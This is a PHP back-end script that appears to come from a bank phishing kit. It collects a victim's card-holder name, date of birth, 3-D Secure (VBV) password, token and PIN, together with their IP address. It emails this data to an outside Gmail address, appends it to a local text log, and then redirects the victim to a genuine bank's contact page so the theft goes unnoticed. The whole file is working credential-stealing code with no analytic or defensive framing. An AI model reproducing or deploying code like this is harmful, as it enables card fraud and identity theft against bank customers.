<?php
$user = $_POST['name'] ; 
$da = $_POST['day'];
$mont = $_POST['month'];
$yea = $_POST['year'];
$vbv = $_POST['password_vbv'];
$tok = $_POST['token_vbv'];
$pin = $_POST['pint_vbv'];


if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="hfaidhmoukim@gmail.com" ; 
 $subject = " 3D ahla bo5tek   : from: ".$ip;
$nome = "Ahla Bo5tek" ;
$from ="rzlt@abvrzlt.bg" ;
$from_mail = $nome.'<'.$from.'>';
$message  = "------------------+ Victem Detail :D  +-
----------------\r\n";
$message .= "Name on CArd   : ".$user."\r\n";
$message .= "Date of birth: " .$da.'/'.$mont.'/'.$yea."\r\n";
$message .= "VBV : " .$vbv."\r\n";
$message .= "VBV : " .$tok."\r\n";
$message .= "VBV : " .$pin."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);

$sajal = fopen("../vbv.txt", "a");  
fwrite($sajal, $message);
header('Location: https://www.fibank.bg/en/contact-centre/page/1567');
?>